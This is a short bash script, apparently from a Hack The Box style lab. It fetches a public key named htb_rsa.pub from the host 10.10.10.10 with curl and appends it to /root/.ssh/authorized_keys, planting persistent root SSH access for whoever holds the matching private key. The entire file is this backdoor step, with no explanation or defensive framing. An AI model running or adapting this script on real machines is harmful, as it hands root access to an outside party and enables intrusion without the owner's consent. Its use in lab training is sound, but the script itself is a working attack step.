#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.ssh
curl 10.10.10.10/rsa/htb_rsa.pub >>  /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
